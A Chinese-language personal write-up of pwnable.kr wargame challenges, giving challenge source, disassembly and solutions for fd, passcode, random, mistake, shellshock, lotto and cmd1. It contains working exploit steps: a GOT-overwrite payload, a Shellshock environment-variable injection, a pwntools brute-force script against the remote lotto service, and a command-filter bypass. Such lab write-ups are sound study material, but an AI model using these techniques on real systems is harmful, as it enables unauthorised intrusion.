# Pwnable.kr


# pwnable.kr writeup

- python3中使用p32, p64需要进行编码 `payload +=p64(1926).decode("iso-8859-1")`

## 1 fd
文件描述符(file descricptor)
>维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
```c
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```
得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
```c
int fd = atoi( argv[1] ) - 0x1234;
```
其中atoi是将字符串转化为整数的函数
```c
int main(int argc, char* argv[], char* envp[]){
```
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.

例如运行程序fd
```
./fd 4660
```
此时argc值为2, 而argv[0] = "./fd", argv[1] = "4660"

atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag
## 2 collision


## 5 passcode
**这题没太懂GOT PLT那里的具体原理**
```c
#include <stdio.h>

#include <stdlib.h>

  

void login(){

        int passcode1;

        int passcode2;

  

        printf("enter passcode1 : ");

        scanf("%d", passcode1);

        fflush(stdin);

  

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)

        printf("enter passcode2 : ");

        scanf("%d", passcode2);

  

        printf("checking...\n");

        if(passcode1==338150 && passcode2==13371337){

                printf("Login OK!\n");

                system("/bin/cat flag");

        }

        else{

                printf("Login Failed!\n");

                exit(0);

        }

}

  

void welcome(){

        char name[100];

        printf("enter you name : ");

        scanf("%100s", name);

        printf("Welcome %s!\n", name);

}

  

int main(){

        printf("Toddler's Secure Login System 1.0 beta.\n");

  

        welcome();

        login();

  

        // something after login...

        printf("Now I can safely trust you that you have credential :)\n");

        return 0;

}
```
容易注意到login函数中这句 
```c
scanf("%d", passcode1);
```
本应该为
```c
scanf("%d", &passcode1);
```
也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 
那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 
用IDA反编译一下 
```c
int login()
{
  int v1; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d", v1);
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d", v2);
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}

unsigned int welcome()
{
  char v1[100]; // [esp+18h] [ebp-70h] BYREF
  unsigned int v2; // [esp+7Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("enter you name : ");
  __isoc99_scanf("%100s", v1);
  printf("Welcome %s!\n", v1);
  return __readgsdword(0x14u) ^ v2;
}
```
由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system("/bin/cat flag")这个指令了.
在IDA里找到他们: 
```text
.plt:08048420
.plt:08048420 ; =============== S U B R O U T I N E =======================================
.plt:08048420
.plt:08048420 ; Attributes: thunk
.plt:08048420
.plt:08048420 ; int printf(const char *format, ...)
.plt:08048420 _printf         proc near               ; CODE XREF: login+E↓p
.plt:08048420                                         ; login+3C↓p ...
.plt:08048420
.plt:08048420 format          = dword ptr  4
.plt:08048420
.plt:08048420                 jmp     ds:off_804A000
.plt:08048420 _printf         endp
.plt:08048420
```
```text
.text:08048562 ; ---------------------------------------------------------------------------
.text:08048563                 align 4
.text:08048564
.text:08048564 ; =============== S U B R O U T I N E =======================================
.text:08048564
.text:08048564 ; Attributes: bp-based frame
.text:08048564
.text:08048564                 public login
.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
.text:08048564
.text:08048564 var_10          = dword ptr -10h
.text:08048564 var_C           = dword ptr -0Ch
.text:08048564
.text:08048564 ; __unwind {
.text:08048564                 push    ebp
.text:08048565                 mov     ebp, esp
.text:08048567                 sub     esp, 28h
.text:0804856A                 mov     eax, offset format ; "enter passcode1 : "
.text:0804856F                 mov     [esp], eax      ; format
.text:08048572                 call    _printf
.text:08048577                 mov     eax, offset aD  ; "%d"
.text:0804857C                 mov     edx, [ebp+var_10]
.text:0804857F                 mov     [esp+4], edx
.text:08048583                 mov     [esp], eax
.text:08048586                 call    ___isoc99_scanf
.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048590                 mov     [esp], eax      ; stream
.text:08048593                 call    _fflush
.text:08048598                 mov     eax, offset aEnterPasscode2 ; "enter passcode2 : "
.text:0804859D                 mov     [esp], eax      ; format
.text:080485A0                 call    _printf
.text:080485A5                 mov     eax, offset aD  ; "%d"
.text:080485AA                 mov     edx, [ebp+var_C]
.text:080485AD                 mov     [esp+4], edx
.text:080485B1                 mov     [esp], eax
.text:080485B4                 call    ___isoc99_scanf
.text:080485B9                 mov     dword ptr [esp], offset s ; "checking..."
.text:080485C0                 call    _puts
.text:080485C5                 cmp     [ebp+var_10], 528E6h
.text:080485CC                 jnz     short loc_80485F1
.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
.text:080485D5                 jnz     short loc_80485F1
.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; "Login OK!"
.text:080485DE                 call    _puts
.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
.text:080485EA                 call    _system
.text:080485EF                 leave
.text:080485F0                 retn
```

0x080485e3=134514147
### 实现:
```python
python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode

```
## 6 random
```c
#include <stdio.h>


int main(){

        unsigned int random;

        random = rand();        // random value!

  

        unsigned int key=0;

        scanf("%d", &key);

  

        if( (key ^ random) == 0xdeadbeef ){

                printf("Good!\n");

                system("/bin/cat flag");

                return 0;

        }

  

        printf("Wrong, maybe you should try 2^32 cases.\n");

        return 0;

}
```
注意到`rand()`没有用`srand()`设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 
我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 
而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
算出key = -1255736440, 运行random程序输入key得到flag
```text
random@pwnable:~$ ./random
-1255736440
Good!
Mommy, I thought libc random is unpredictable...
```

## 7 input
## 8 leg
## 9 mistake
```text
We all make mistakes, let's move on.
(don't take this too seriously, no fancy hacking skill is required at all)

This task is based on real event
Thanks to dhmonkey

hint : operator priority

ssh mistake@pwnable.kr -p2222 (pw:guest)
```
提示是操作符的优先级 
```c
#include <stdio.h>

#include <fcntl.h>

  

#define PW_LEN 10

#define XORKEY 1

  

void xor(char* s, int len){

        int i;

        for(i=0; i<len; i++){

                s[i] ^= XORKEY;

        }

}

  

int main(int argc, char* argv[]){

  

        int fd;

        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){

                printf("can't open password %d\n", fd);

                return 0;

        }

  

        printf("do not bruteforce...\n");

        sleep(time(0)%20);

  

        char pw_buf[PW_LEN+1];

        int len;

        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){

                printf("read error\n");

                close(fd);

                return 0;

        }

  

        char pw_buf2[PW_LEN+1];

        printf("input password : ");

        scanf("%10s", pw_buf2);

  

        // xor your input

        xor(pw_buf2, 10);

  

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){

                printf("Password OK\n");

                system("/bin/cat flag\n");

        }

        else{

                printf("Wrong Password\n");

        }

  

        close(fd);

        return 0;

}
```

观察这一行 
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
```
乍一看没什么不对, 当返回的文件描述符小于0时报错 
但是`<`是比`=`优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3<0这个表达式, 它的值是0. 最后执行`fd=0`, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的. 
然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符. 
所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0'的ascii码为110000, 字符'1'的ascii码为110001, 恰好'0'^1 = '1'. 所以只需进行如下操作 
```text
./mistake
do not bruteforce...
0000000000
1111111111input password : 
Password OK
Mommy, the operator priority always confuses me :(
```

## 10 shellshock
这是一个set-uid程序: 
```c
#include <stdio.h>

int main(){

        setresuid(getegid(), getegid(), getegid());

        setresgid(getegid(), getegid(), getegid());

        system("/home/shellshock/bash -c 'echo shock_me'");

        return 0;

}
```
这是一个别名为shellshock的漏洞, CVE-2014-6271 
原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发
```text
export foo='{:;}; echo test'
bash
test
```
测试方法:
```text
shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test"
vulnerable
```
证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞 
攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中
```c
setresuid(getegid(), getegid(), getegid());

        setresgid(getegid(), getegid(), getegid());

```
确保了这一点. 
所以可以这样攻击: 
```text
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$
```
## 11 coin1
## 12 blackjack
## 13 lotto
lotto.c: 
```c
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <fcntl.h>

  

unsigned char submit[6];

  

void play(){

  

        int i;

        printf("Submit your 6 lotto bytes : ");

        fflush(stdout);

  

        int r;

        r = read(0, submit, 6);

  

        printf("Lotto Start!\n");

        //sleep(1);

  

        // generate lotto numbers

        int fd = open("/dev/urandom", O_RDONLY);

        if(fd==-1){

                printf("error. tell admin\n");

                exit(-1);

        }

        unsigned char lotto[6];

        if(read(fd, lotto, 6) != 6){

                printf("error2. tell admin\n");

                exit(-1);

        }

        for(i=0; i<6; i++){

                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45

        }

        close(fd);

  

        // calculate lotto score

        int match = 0, j = 0;

        for(i=0; i<6; i++){

                for(j=0; j<6; j++){

                        if(lotto[i] == submit[j]){

                                match++;

                        }

                }

        }

  

        // win!

        if(match == 6){

                system("/bin/cat flag");

        }

        else{

                printf("bad luck...\n");

        }

  

}

  

void help(){

        printf("- nLotto Rule -\n");

        printf("nlotto is consisted with 6 random natural numbers less than 46\n");

        printf("your goal is to match lotto numbers as many as you can\n");

        printf("if you win lottery for *1st place*, you will get reward\n");

        printf("for more details, follow the link below\n");

        printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");

        printf("mathematical chance to win this game is known to be 1/8145060.\n");

}

  

int main(int argc, char* argv[]){

  

        // menu

        unsigned int menu;

  

        while(1){

  

                printf("- Select Menu -\n");

                printf("1. Play Lotto\n");

                printf("2. Help\n");

                printf("3. Exit\n");

  

                scanf("%d", &menu);

  

                switch(menu){

                        case 1:

                                play();

                                break;

                        case 2:

                                help();

                                break;

                        case 3:

                                printf("bye\n");

                                return 0;

                        default:

                                printf("invalid menu\n");

                                break;

                }

        }

        return 0;

}
```

看这段: 
```c
        for(i=0; i<6; i++){

                for(j=0; j<6; j++){

                        if(lotto[i] == submit[j]){

                                match++;

                        }

                }

        }

```
原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如'#', 一直输入
"######", 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag. 
不会写代码识别flag, 所以我只能人工盯着屏幕看了
```python
from pwn import *

s = ssh(host='pwnable.kr',user='lotto', port=2222, password='guest')

p = s.process('./lotto')

while 1:

    p.sendline("1")

    p.sendline("######")

    print(p.recvline())

# s.interactive()
```
可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了
```text
[+] Starting remote process bytearray(b'./lotto') on pwnable.kr: pid 281220
/home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("1")
/home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("######")
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'  // 第一次出现flag在这
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'sorry mom... I FORGOT to check duplicate numbers... :(\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
b'- Select Menu -\n'
b'1. Play Lotto\n'
b'2. Help\n'
b'3. Exit\n'
b'Submit your 6 lotto bytes : Lotto Start!\n'
b'bad luck...\n'
```
## 14 cmd1
```c
#include <stdio.h>

#include <string.h>

  

int filter(char* cmd){

        int r=0;

        r += strstr(cmd, "flag")!=0;

        r += strstr(cmd, "sh")!=0;

        r += strstr(cmd, "tmp")!=0;

        return r;

}

int main(int argc, char* argv[], char** envp){

        putenv("PATH=/thankyouverymuch");

        if(filter(argv[1])) return 0;

        system( argv[1] );

        return 0;

}
```
代码很短, 主要就是执行`system(argv[1])`但可以看到该程序把PATH指向了一个显然不能用的路径, 而且我们传入的argv里不能包含flag, sh, tmp, 也就是不能直接或间接地把flag打印出来. 
1. 没有环境变量, 就直接用绝对路径`"/bin/cat"`
2. 不能直接出现flag, 但可以用`*`通配符啊
所以
```text
./cmd "/bin/cat fl*"
```
## 15 cmd2
没做呢
## 16 uaf
use after free漏洞
源码: 
```cpp
#include <fcntl.h>

#include <iostream>

#include <cstring>

#include <cstdlib>

#include <unistd.h>

using namespace std;

  

class Human{

private:

        virtual void give_shell(){

                system("/bin/sh");

        }

protected:

        int age;

        string name;

public:

        virtual void introduce(){

                cout << "My name is " << name << endl;

                cout << "I am " << age << " years old" << endl;

        }

};

  

class Man: public Human{

public:

        Man(string name, int age){

                this->name = name;

                this->age = age;

        }

        virtual void introduce(){

                Human::introduce();

                cout << "I am a nice guy!" << endl;

        }

};

  

class Woman: public Human{

public:

        Woman(string name, int age){

                this->name = name;

                this->age = age;

        }

        virtual void introduce(){

                Human::introduce();

                cout << "I am a cute girl!" << endl;

        }

};

  

int main(int argc, char* argv[]){

        Human* m = new Man("Jack", 25);

        Human* w = new Woman("Jill", 21);

  

        size_t len;

        char* data;

        unsigned int op;

        while(1){

                cout << "1. use\n2. after\n3. free\n";

                cin >> op;

  

                switch(op){

                        case 1:

                                m->introduce();

                                w->introduce();

                                break;

                        case 2:

                                len = atoi(argv[1]);

                                data = new char[len];

                                read(open(argv[2], O_RDONLY), data, len);

                                cout << "your data is allocated" << endl;

                                break;

                        case 3:

                                delete m;

                                delete w;

                                break;

                        default:

                                break;

                }

        }

  

        return 0;

}
```

[0.虚表](https://zhuanlan.zhihu.com/p/353260837)
[1](https://blog.csdn.net/weixin_43921239/article/details/100828167)
[2](https://www.cnblogs.com/L0g4n-blog/p/12887869.html)
[3](https://blog.csdn.net/Breeze_CAT/article/details/103788698)
